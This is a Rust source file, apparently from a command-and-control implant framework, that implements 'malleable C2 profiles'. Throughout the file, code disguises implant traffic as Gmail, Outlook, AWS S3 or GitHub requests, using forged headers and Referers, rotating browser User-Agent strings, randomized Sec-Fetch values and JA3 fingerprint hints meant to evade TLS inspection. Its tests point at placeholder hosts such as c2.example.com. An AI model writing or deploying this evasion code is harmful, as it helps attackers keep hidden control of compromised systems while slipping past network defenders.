// transport/profile.rs
// 🛡️ Phase 3: Malleable C2 Profile
//
// Provides customizable HTTP request templates that make C2 traffic look like
// normal application traffic. Each profile defines headers, URI patterns,
// and body formats that can be swapped at build time.

use std::collections::HashMap;

/// A malleable profile defines how C2 traffic should look on the wire.
#[derive(Clone, Debug)]
pub struct MalleableProfile {
    /// Profile name (e.g. "gmail", "outlook", "aws-s3")
    pub name: &'static str,
    /// HTTP method for requests
    pub method: &'static str,
    /// URI template with placeholders
    pub uri_template: &'static str,
    /// Static headers to add
    pub headers: &'static [(&'static str, &'static str)],
    /// User-Agent string
    pub user_agent: &'static str,
    /// JA3 fingerprint hint (browser to mimic)
    pub ja3_hint: &'static str,
}

// Pre-defined profiles mimicking common legitimate services.
// These are selected at build time via the `C2_PROFILE` env var or config.

pub const PROFILE_GMAIL: MalleableProfile = MalleableProfile {
    name: "gmail",
    method: "POST",
    uri_template: "/mail/u/0/?sync={session_id}&ati={jitter}",
    headers: &[
        ("Accept", "application/json, text/plain, */*"),
        ("Accept-Language", "en-US,en;q=0.9"),
        ("X-Gmail-Travel", "true"),
        ("Referer", "https://mail.google.com/mail/u/0/"),
    ],
    user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    ja3_hint: "chrome-126",
};

pub const PROFILE_OUTLOOK: MalleableProfile = MalleableProfile {
    name: "outlook",
    method: "POST",
    uri_template: "/owa/sessiondata.ashx?ac=1&appcacheclient=0&crr=1&crs=1&wt-id={session_id}",
    headers: &[
        ("Accept", "application/json"),
        ("Accept-Language", "en-US"),
        ("X-OWA-Version", "16.0.17714.2"),
        ("Referer", "https://outlook.live.com/owa/"),
    ],
    user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
    ja3_hint: "edge-126",
};

pub const PROFILE_AWS: MalleableProfile = MalleableProfile {
    name: "aws-s3",
    method: "PUT",
    uri_template: "/{bucket}/{key}?x-id=PutObject",
    headers: &[
        ("Accept", "*/*"),
        ("Accept-Language", "en-US"),
        ("X-Amz-Content-SHA256", "UNSIGNED-PAYLOAD"),
        ("X-Amz-Date", "{timestamp}"),
    ],
    user_agent: "aws-sdk-cpp/1.11.0",
    ja3_hint: "aws-sdk",
};

pub const PROFILE_GITHUB: MalleableProfile = MalleableProfile {
    name: "github",
    method: "POST",
    uri_template: "/api/graphql",
    headers: &[
        ("Accept", "application/vnd.github+json"),
        ("Accept-Language", "en-US"),
        ("X-GitHub-Api-Version", "2022-11-28"),
        ("Referer", "https://github.com/"),
    ],
    user_agent: "GitHub-Hookshot/600079ad",
    ja3_hint: "github-webhook",
};

/// Default profile — path is `/socket` (not the eternal `/ws` fingerprint).
/// UA is a Chrome LTS-style string; pool rotation happens at connect time.
pub const PROFILE_DEFAULT: MalleableProfile = MalleableProfile {
    name: "default",
    method: "POST",
    uri_template: "/socket",
    headers: &[
        ("Accept", "*/*"),
        ("Accept-Language", "en-US,en;q=0.9"),
    ],
    user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    ja3_hint: "chrome-128",
};

/// Rotate among realistic browser UAs (Chrome family aligned with ja3 hints).
pub fn pick_user_agent(profile: &MalleableProfile) -> &'static str {
    const POOL: &[&str] = &[
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    ];
    if profile.name != "default" && !profile.user_agent.is_empty() {
        return profile.user_agent;
    }
    let idx = (crate::utils::next_u32_secure() as usize) % POOL.len();
    POOL[idx]
}

/// Sec-Fetch values drawn from realistic browser distributions.
pub fn pick_sec_fetch() -> (&'static str, &'static str, &'static str) {
    // (dest, mode, site)
    const VARIANTS: &[(&str, &str, &str)] = &[
        ("empty", "cors", "cross-site"),
        ("empty", "cors", "same-site"),
        ("empty", "websocket", "cross-site"),
        ("empty", "websocket", "same-origin"),
    ];
    let idx = (crate::utils::next_u32_secure() as usize) % VARIANTS.len();
    VARIANTS[idx]
}

/// Get profile by name. Returns default if not found.
pub fn get_profile(name: &str) -> MalleableProfile {
    match name {
        "gmail" => PROFILE_GMAIL,
        "outlook" => PROFILE_OUTLOOK,
        "aws" | "s3" | "aws-s3" => PROFILE_AWS,
        "github" => PROFILE_GITHUB,
        _ => PROFILE_DEFAULT,
    }
}

/// Expand uri_template placeholders for a single connect attempt.
/// Supported: {session_id}, {jitter}, {bucket}, {key}, {timestamp}
pub fn expand_uri_template(template: &str) -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let session_id = format!("{:08x}", random_u32());
    let jitter = format!("{}", (random_u32() % 900) + 100);
    let bucket = "prod-assets";
    let key = format!("obj/{session_id}");
    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let timestamp = format_amz_date(ts);

    template
        .replace("{session_id}", &session_id)
        .replace("{jitter}", &jitter)
        .replace("{bucket}", bucket)
        .replace("{key}", &key)
        .replace("{timestamp}", &timestamp)
}

fn format_amz_date(secs: u64) -> String {
    // Minimal UTC-ish YYYYMMDDTHHMMSSZ without chrono dependency
    // Good enough for header camouflage (not cryptographic calendar accuracy).
    const SECS_PER_DAY: u64 = 86400;
    let days = secs / SECS_PER_DAY;
    let rem = secs % SECS_PER_DAY;
    let h = rem / 3600;
    let m = (rem % 3600) / 60;
    let s = rem % 60;
    // Civil date from days since 1970-01-01 (Howard Hinnant algorithm)
    let z = days as i64 + 719468;
    let era = if z >= 0 { z } else { z - 146096 } / 146097;
    let doe = (z - era * 146097) as u64;
    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146096) / 365;
    let y = yoe as i64 + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let mth = if mp < 10 { mp + 3 } else { mp - 9 };
    let year = if mth <= 2 { y + 1 } else { y };
    format!("{:04}{:02}{:02}T{:02}{:02}{:02}Z", year, mth, d, h, m, s)
}

fn random_u32() -> u32 {
    let mut b = [0u8; 4];
    let _ = getrandom::getrandom(&mut b);
    u32::from_le_bytes(b)
}

/// Rebuild base WebSocket URL so path/query come from profile.uri_template.
/// Keeps scheme + authority from `base_url`; replaces path and query.
/// Example: `wss://c2.example/ws` + gmail template → `wss://c2.example/mail/u/0/?sync=...`
pub fn url_with_profile_path(base_url: &str, profile: &MalleableProfile) -> String {
    let path = expand_uri_template(profile.uri_template);
    let path = if path.starts_with('/') {
        path
    } else {
        format!("/{path}")
    };

    // Split scheme://authority/rest
    let without_frag = base_url.split('#').next().unwrap_or(base_url);
    if let Some(scheme_end) = without_frag.find("://") {
        let after_scheme = &without_frag[scheme_end + 3..];
        let auth_end = after_scheme.find('/').unwrap_or(after_scheme.len());
        let authority = &after_scheme[..auth_end];
        let scheme = &without_frag[..scheme_end];
        return format!("{scheme}://{authority}{path}");
    }
    // Fallback: append/replace poorly formed URLs
    format!("{without_frag}{path}")
}

/// Apply a profile to a WebSocket request builder.
/// Adds headers and sets user-agent to match the profile.
/// Dynamic values like {timestamp} in header values are expanded.
#[cfg(feature = "ws")]
pub fn apply_profile_headers(
    profile: &MalleableProfile,
    builder: &mut tokio_tungstenite::tungstenite::http::Request<()>,
) {
    use tokio_tungstenite::tungstenite::http::header;
    let ua_str = pick_user_agent(profile);
    if !ua_str.is_empty() {
        if let Ok(ua) = ua_str.parse() {
            builder.headers_mut().insert(header::USER_AGENT, ua);
        }
    }
    for (k, v) in profile.headers.iter() {
        let expanded = expand_uri_template(v);
        if let Ok(name) = header::HeaderName::from_bytes(k.as_bytes()) {
            if let Ok(value) = expanded.parse() {
                builder.headers_mut().insert(name, value);
            }
        }
    }
}

/// Generate a JA3-like fingerprint for TLS ClientHello inspection evasion.
/// This is a simplified hint; full JA3 randomization requires TLS stack control
/// (rustls ClientConfig cipher order) — see ws.rs notes.
pub fn get_ja3_hint(profile: &MalleableProfile) -> &'static str {
    profile.ja3_hint
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn expand_replaces_placeholders() {
        let s = expand_uri_template("/mail/u/0/?sync={session_id}&ati={jitter}");
        assert!(s.starts_with("/mail/u/0/?sync="));
        assert!(!s.contains("{session_id}"));
        assert!(!s.contains("{jitter}"));
    }

    #[test]
    fn url_with_profile_replaces_path() {
        let p = get_profile("gmail");
        let u = url_with_profile_path("wss://c2.example.com:443/old/ws", &p);
        assert!(u.starts_with("wss://c2.example.com:443/mail/u/0/"));
        assert!(!u.contains("/old/ws"));
    }

    #[test]
    fn default_profile_not_fixed_ws_path() {
        let p = get_profile("default");
        assert_ne!(p.uri_template, "/ws");
        assert!(p.uri_template.starts_with('/'));
    }

    #[test]
    fn sec_fetch_variants_are_nonempty() {
        let (d, m, s) = pick_sec_fetch();
        assert!(!d.is_empty());
        assert!(!m.is_empty());
        assert!(!s.is_empty());
    }

    #[test]
    fn default_profile_socket_path() {
        let p = get_profile("default");
        let u = url_with_profile_path("ws://127.0.0.1:8080/anything", &p);
        assert_eq!(u, "ws://127.0.0.1:8080/socket");
        assert!(!u.ends_with("/ws"));
    }
}
